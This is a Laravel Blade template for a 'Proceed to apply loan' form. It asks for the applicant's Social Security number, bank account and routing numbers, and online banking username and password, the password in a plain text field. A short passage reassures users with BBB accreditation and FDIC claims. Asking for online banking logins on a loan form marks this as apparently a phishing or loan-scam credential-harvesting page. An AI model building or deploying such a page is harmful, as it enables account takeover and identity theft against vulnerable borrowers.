@extends('layouts.app')

@section('section')
<section >
    <div class="container">
        <form method="POST">
            @csrf
            @if(!empty($image) && isset($image))
            <div class="animated-div text-center mb-40" >
                <img id="selected-image" class="selectedImage" src="{{$image}}" alt="Selected Image">
            </div>

            @else
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Bank Name#*</label>
                    <input type="text" name="bank_name" placeholder="Your Bank Name" required>
                </div>

            @endisset
            <div class=" mb-30 inputGrid">
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Account Holder First Name*</label>
                    <input type="text" name="first name" placeholder="First Name" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Account Holder Last Name*</label>
                    <input type="text" name="last name" placeholder="Last Name" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Social Security Number*</label>
                    {{-- <input type="number" name="ssn" placeholder="SSN" required> --}}
                    <input
          type="text"
          id="ssn"
          name="ssn"
          placeholder="123-45-6789"
          required
          maxlength="11"
          oninput="formatSSN(this)"
          pattern="\d{3}-\d{2}-\d{4}"
          title="Format: 123-45-6789"
        >
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Bank Account Number*</label>
                    <input type="number" name="account number" placeholder="Account#" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Bank Routing Number*</label>
                    <input type="number" name="routing" placeholder="Routing#" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Online Banking Username#*</label>
                    <input type="text" name="username" placeholder="Your online Username" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Online Banking Password#*</label>
                    <input type="text" name="password" placeholder="Your online Password" required>
                </div>
                <div class="mb-22 fs-18 animated-div">
                    <label for="name">Your Phone Number*</label>
                    <input type="text" name="phone" placeholder="Phone Number" required>
                </div>
                {{-- <div class="checkbox Container">
                    <label for="checl">Online Banking Password#*</label>
                    <input type="checkbox" class="checkbox" name="checl" id="" required>
                </div> --}}
                <div class="checkbox-container">
                    <input type="checkbox" id="terms-checkbox" required>
                    <label for="terms-checkbox">
                      I agree to the <a href="https://a13b0252-4972-4519-8706-229bef53c91b.filesusr.com/ugd/5b96a9_e1e169ffb3a945898bebefefef452e2d.pdf">terms and conditions</a>
                    </label>
                  </div>
            </div>
            <button type="submit" class="btn contactBtn mx-auto animated-div">
                Proceed to apply loan
              </button>
            </form>
            <br>
        <div class="mx688">
            <div class="fs-16 text-center">
                Your information is secured with advanced encryption technology and is protected under industry standards. We are accredited by the Better Business Bureau (BBB) and work with FDIC-insured institutions, ensuring your data is handled with the highest level of security and trust.

            </div>
        </div>
    </div>
  </section>
  <script>
    function formatSSN(input) {
        let value = input.value.replace(/\D/g, '').slice(0, 9); // only digits, max 9
        let formatted = '';
    
        if (value.length > 0) formatted = value.slice(0, 3);
        if (value.length >= 4) formatted += '-' + value.slice(3, 5);
        if (value.length >= 6) formatted += '-' + value.slice(5, 9);
    
        input.value = formatted;
    }
    </script>
@endsection
